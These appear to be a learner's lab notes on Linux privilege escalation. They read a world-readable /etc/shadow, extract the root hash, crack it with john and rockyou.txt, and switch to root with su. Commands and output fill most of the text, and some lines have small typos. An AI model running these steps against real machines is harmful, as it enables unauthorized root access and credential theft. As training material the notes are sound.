The /etc/shadow file contains user password hashes, and by default is not readable by any user except for root.

If we are able to read the contents of the /etc/shadow file, we might be able to crack the root user’s password hash.

If we are able to modify the /etc/shadow file, we can replace the root user’s password hash with one we know.

```bash - target
./lse.sh -i | more
```

![[Pasted image 20211230132303.png]]

1. Check the permissions of the / / etc /shadow file:

```bash - target
ls -l /etc/shadow
```

-rw-r—rw- 1 root shadow 810 May 13 2017 /etc/shadow

-   Note that it is world readable.

2. Extract the root user’s password hash:

```bash target
head -n 1 /etc/shadow
```

```root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::```

3. Save the password hash in a file (e.g. hash.txt):

```bash - kali
echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'```
```

4. Crack the password hash using john :

```bash - kali
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

password123 (?)

5. Use the su command to switch to the root user, entering the password we cracked when prompted:

```bash - target
su
```

```bash - target
Password123
```

```bash - target
id
```

>uid=0(root) gid=0(root) groups=0(root)
